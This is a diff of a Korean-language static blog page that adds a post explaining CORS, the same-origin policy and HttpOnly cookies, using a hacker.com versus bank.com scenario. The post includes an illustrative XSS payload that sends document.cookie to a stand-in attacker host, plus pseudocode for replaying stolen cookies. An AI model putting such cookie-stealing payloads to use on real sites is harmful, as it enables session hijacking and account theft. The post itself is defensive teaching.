@@ -160,11 +160,11 @@ ga('send', 'pageview');
         </div>
         <div class="article-info profile-block">
             <div class="article-info-block">
-                2
+                3
                 <span>posts</span>
             </div>
             <div class="article-info-block">
-                2
+                5
                 <span>tags</span>
             </div>
         </div>
@@ -189,6 +189,187 @@ ga('send', 'pageview');
 
             
             <section id="main">
+    <article id="post-CORS" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/08/06/CORS/">CORS</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/08/06/CORS/">
+            <time datetime="2016-08-06T02:07:02.000Z" itemprop="datePublished">2016-08-06</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/http/">http</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/ajax/">ajax</a>, <a class="tag-link" href="/tags/http/">http</a>, <a class="tag-link" href="/tags/security/">security</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <h1 id="CORS-Cross-Origin-Resource-Sharing"><a href="#CORS-Cross-Origin-Resource-Sharing" class="headerlink" title="CORS(Cross-Origin Resource Sharing)"></a>CORS(Cross-Origin Resource Sharing)</h1><p>나는 웹개발을 처음하면서 당황스러웠던 적이 몇번 있는데, 그중 한가지는 브라우져 콘솔창에서</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">XMLHttpRequest cannot load. No &apos;Access-Control-Allow-Origin&apos;</div><div class="line">header is present on the requested resource. Origin is therefore</div><div class="line">not allowed access.</div></pre></td></tr></table></figure>
+<p>이런 메세지를 보았던 경우였다.</p>
+<p>동료와 함께 작업하며, 각각의 서버를 따로 만들고 서로 통신해서 데이터를 주고 받자고 약속한뒤<br>domain1 에서 domain2 로 ajax api 통신을 하던중에 보던 메세지였다. 구글링을 통해 꼼수로 해결했지만, 왜 이런 정책이 존재하는가에 대해 궁금했었다.</p>
+<h3 id="same-origin-policy-동일-출처-정책"><a href="#same-origin-policy-동일-출처-정책" class="headerlink" title="same origin policy (동일 출처 정책)"></a>same origin policy (동일 출처 정책)</h3><p>HTTP 요청은 기본적으로 Cross-Site HTTP Requests가 가능하다. 다시 말하면, <code>&lt;img&gt;</code> 태그로 다른 도메인의 이미지 파일을 가져오거나, <code>&lt;link&gt;</code> 태그로 다른 도메인의 CSS를 가져오거나, <code>&lt;script&gt;</code> 태그로 다른 도메인의 JavaScript 라이브러리를 가져오는 것이 모두 가능하다. 하지만 <code>&lt;script&gt;&lt;/script&gt;</code> 로 둘러싸여 있는 스크립트에서 생성된 Cross-Site HTTP Requests는 Same Origin Policy를 적용 받기 때문에 Cross-Site HTTP Requests가 불가능하다.</p>
+<p>그러니까, XMLhttpRequest(xhq)로 ajax 통신을 할때는, request header 에 origin 을 보내는데, 이것이 host와 다르다면 제한이 걸린다.</p>
+<p>가정을 해보겠다.</p>
+<ol>
+<li>우리는 <code>hacker.com</code> 으로 웹서버를 띄우고 <code>index.html</code> 을 간단히 만들어,(해커가 서버를 만들었다)</li>
+<li><code>hacker.com/index.html</code> 을 브라우져로 성공적으로 열었다.(미끼가 해커의 웹사이트에 접속했다)</li>
+<li>그런데 그 <code>index.html</code> 안에서 JQuery를 이용해</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$.ajax(&#123;</div><div class="line">    url: <span class="string">"http://bank.com/getUserPassword"</span></div><div class="line">  &#125;).then(saveToHackersDB)</div></pre></td></tr></table></figure>
+<p>를 시도하게 된다.</p>
+<p>클라이언트는 이미 <code>bank.com</code> 에 로그인한 상태라고 가정해보자, getUserPassword 는 session-cookie auth가 된 상태에만 가능한 API 이다.<br>그러던중 다른탭에서 <code>hacker.com</code> 에 들어가게 되고, 그안에서 저 API가 자동으로 호출된다면 어떻게 될까?</p>
+<p>실제 <code>bank.com</code> 에서의 http call 은 이루어 진다. 실제로 HTTP request 는 <code>bank.com</code> 의 서버에 도착하게 되고, 정상처리 한다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//(In bank.com server) HTTP​ Header</div><div class="line">host: &apos;bank.com&apos;,</div><div class="line">connection: &apos;keep-alive&apos;,</div><div class="line">accept: &apos;*/*&apos;,</div><div class="line">origin: &apos;http://hacker.com&apos;,</div></pre></td></tr></table></figure>
+<p>식으로 <code>bank.com</code> 서버 로그 헤더에는 잘 전달 된다.</p>
+<p>하지만 클라이언트에서는</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">XMLHttpRequest cannot load http://bank.com/getUserPassword.</div><div class="line">No &apos;Access-Control-Allow-Origin&apos; header is present on the requested resource.</div><div class="line">Origin &apos;http://hacker.com&apos; is therefore not allowed access.</div></pre></td></tr></table></figure>
+<p>같은 에러를 콘솔에서 만날수 있다.</p>
+<blockquote>
+<p><code>bank.com</code> 의 서버에는 잘 전달 되었는데 무슨 보안인가? 이 메세지를 보기 싫다고 <code>&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;</code> 헤더 등을 서버에 설정하는 귀찮은 짓(CORS)을 왜 하는걸까?</p>
+</blockquote>
+<p><strong>이것은, 클라이언트(브라우져) 보안 정책이다.</strong></p>
+<p>크로스 도메인의 호출후에, 클라이언트 브라우져에 값을 받아와서, 읽어내는 것이 불가능 하다는것이다.</p>
+<p>여기서 잠깐 히스토리를 알아본다면,</p>
+<p>AJAX가 널리 사용되면서 <code>&lt;script&gt;&lt;/script&gt;</code> 로 둘러싸여 있는 스크립트에서 생성되는 XMLHttpRequest에 대해서도 Cross-Site HTTP Requests가 가능해야 한다는 요구가 늘어나자 W3C에서 CORS(쉐어링)라는 이름의 권고안 XHR level 2 가 나오게 되었다.</p>
+<p>또 추가로, XHR Level2 를 기반으로 하는 COR(Cross-Origin-Request) 는 기본적으로 쿠키 정보가 포함되지 않는데, XHR 2 객체에서 제공하는 <code>withCredentials</code> 속성을 사용하면 쿠키 정보가 포함된 리퀘스트를 발생 시킬 수 있다.</p>
+<p><strong>그렇기 때문에 동일출처원칙이 없다면, 해커가 <code>withCredentials</code> 로 요청을 하게 되고 브라우져에서 쿠키를 이용한 탈취가 가능하게 되는것이다.</strong></p>
+<p><code>Access-Control-Allow-Origin</code> 헤더는 오리진 을 판단하는것이며, <code>Access-Control-Allow-Credentials</code> 헤더의 조건은 다음과 같다.</p>
+<ul>
+<li>쿠키 정보가 포함된 COR 에 대한 응답에는 반드시 <code>Access-Control-Allow-Credentials : true</code> 헤더가 포함되어 있어야 브라우저가<br>받아들일수 있다.</li>
+<li>해당 헤더가 포함된 응답은 <code>Access-ControlAllow-Origin</code> 헤더의 값에 와일드카드(*) 가 아닌 출처에 대한 정확한 도메인이 지정되어 있어야 한다.</li>
+</ul>
+<p>좀 더 세부적인 옵션들이 많지만, 생략하겠다.</p>
+<p>FYI) 서버코드를 수정하지 않고도(CORS 적용등) 클라이언트 브라우져 에서 값을 읽어내는것이 불가능한것은 아니다.<br>크롬 확장앱에 CORS 앱을 설치하거나, 크롬을 disable web security 옵션을 해주기만 해도 된다.<br>(하지만 이것은 클라이언트 브라우져를 개인이 건드린다는 점에서 해커가 어찌할 도리가 없는 부분이다)</p>
+<p><strong>Same-Origin 정책은 도메인이 기원지를 나타낸다고 가정했을 때, 다른 도메인에서 온 웹 애플리케이션들을 고립시키는 현재 브라우저의 보호 메커니즘 중 하나이다. 동일출처정책은 보내고 받는 것을 구별하는데, 보낼때는 다른 출처가 가능하지만, 받을 때는 동일한 출처만 가능하다. 악의적인 웹사이트가 다른 웹사이트로부터 기밀 정보를 읽는 것을 막기위한 정책이다.</strong></p>
+<h3 id="Cookie-HttpOnly"><a href="#Cookie-HttpOnly" class="headerlink" title="Cookie HttpOnly"></a>Cookie HttpOnly</h3><p>쿠키는 같은 도메인의 http 요청이 있을때 (어떤 API든) 함께 전송된다.</p>
+<p>단, 쿠키는 포트로 도메인을 구분짓지 않는다.(Cookies do not provide isolation by port) 즉, <code>localhost:3000</code>에서 가져온 쿠키는 <code>localhost:6666</code> 으로도 전송된다.<br>(로컬에서 실험하고 싶다면 <code>localhost</code>와 <code>127.0.0.1</code> 로 테스트 하라. 둘은 다른 도메인이다)</p>
+<p>따라서, <code>bank.com</code> 의 쿠키는 <code>hacker.com</code> 으로 전송되지 못한다. 그렇기 때문에 해커는 자바스크립트의 <code>document.cookie</code> 에 접근하고 싶어하는 것이다.</p>
+<p><strong>쿠키는 httpOnly 옵션이 있을때 javascript 에서 직접 접근이 불가능하다.</strong></p>
+<p>만약, 이 옵션이 없다면 XSS 공격에 의해 <code>bank.com</code> 의 게시글에 <em>교묘한</em> 스크립트가 삽입된다면,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&apos;http://hacker.com/stealCookie?cookie&apos;+documnet.cookie /&gt;</div></pre></td></tr></table></figure>
+<p>처럼 해커의 서버에 은행의 쿠키들이 수집 될수 있을것이다.</p>
+<p>그럼 해커는 이 수집된 쿠키로 <code>hacker.com</code> 서버 안에서</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">request.setCookie(cookie)</div><div class="line">request.get(&apos;http://bank.com/getUserPassword&apos;).then(res)</div></pre></td></tr></table></figure>
+<p>한다면, 동일출처정책을 피해서 해킹에 성공한다.</p>
+<p><strong>서버-서버간의 직접 통신은 동일출처정책이 적용되지 않기 때문이다.</strong></p>
+<p>FYI) Using HttpOnly cookies will prevent XSS attacks from getting those cookies.Unless your browser does not support HttpOnly. 브라우져가 httpOnly를 지원하지 않는다면 말짱 꽝이겠지만 말이다.</p>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://scarfunk.github.io/2016/08/06/CORS/" data-id="cirijksa10000en08e64rvmpm" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://scarfunk.github.io/2016/08/06/CORS/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://scarfunk.github.io/2016/08/06/CORS/">Comments</a>
+    
+
+        </footer>
+    </div>
+    
+</article>
+
+
+
     <article id="post-es6-for-humans" class="article article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
@@ -430,7 +611,7 @@ ga('send', 'pageview');
 
 </div>
 
-    <a data-url="http://scarfunk.github.io/2016/07/21/es6-for-humans/" data-id="cir6iers90000hj08b1pdopxg" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+    <a data-url="http://scarfunk.github.io/2016/07/21/es6-for-humans/" data-id="cirijksav000ben088sf76rea" class="article-share-link"><i class="fa fa-share"></i>Share</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -566,7 +747,7 @@ this is not work.
 
 </div>
 
-    <a data-url="http://scarfunk.github.io/2016/07/21/test/" data-id="cir6ierse0002hj0881c1em8u" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+    <a data-url="http://scarfunk.github.io/2016/07/21/test/" data-id="cirijksas0009en082lif87ra" class="article-share-link"><i class="fa fa-share"></i>Share</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -656,6 +837,15 @@ this is not work.
                     <li>
                         
                         <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/http/">http</a></p>
+                            <p class="item-title"><a href="/2016/08/06/CORS/" class="title">CORS</a></p>
+                            <p class="item-date"><time datetime="2016-08-06T02:07:02.000Z" itemprop="datePublished">2016-08-06</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-inner">
                             <p class="item-category"><a class="article-category-link" href="/categories/javascript/">javascript</a></p>
                             <p class="item-title"><a href="/2016/07/21/es6-for-humans/" class="title">es6-for-humans</a></p>
                             <p class="item-date"><time datetime="2016-07-21T14:23:09.000Z" itemprop="datePublished">2016-07-21</time></p>
@@ -680,7 +870,7 @@ this is not work.
     <div class="widget-wrap">
         <h3 class="widget-title">categories</h3>
         <div class="widget">
-            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/">javascript</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/talk/">talk</a><span class="category-list-count">1</span></li></ul>
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/">javascript</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/talk/">talk</a><span class="category-list-count">1</span></li></ul>
         </div>
     </div>
 
@@ -689,7 +879,7 @@ this is not work.
     <div class="widget-wrap">
         <h3 class="widget-title">archives</h3>
         <div class="widget">
-            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">2</span></li></ul>
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">2</span></li></ul>
         </div>
     </div>
 
@@ -698,7 +888,7 @@ this is not work.
     <div class="widget-wrap">
         <h3 class="widget-title">tags</h3>
         <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/daily/">daily</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/es6/">es6</a><span class="tag-list-count">1</span></li></ul>
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ajax/">ajax</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/daily/">daily</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/es6/">es6</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/">http</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/">security</a><span class="tag-list-count">1</span></li></ul>
         </div>
     </div>
 
@@ -707,7 +897,7 @@ this is not work.
     <div class="widget-wrap">
         <h3 class="widget-title">tag cloud</h3>
         <div class="widget tagcloud">
-            <a href="/tags/daily/" style="font-size: 10px;">daily</a> <a href="/tags/es6/" style="font-size: 10px;">es6</a>
+            <a href="/tags/ajax/" style="font-size: 10px;">ajax</a> <a href="/tags/daily/" style="font-size: 10px;">daily</a> <a href="/tags/es6/" style="font-size: 10px;">es6</a> <a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/security/" style="font-size: 10px;">security</a>
         </div>
     </div>
 
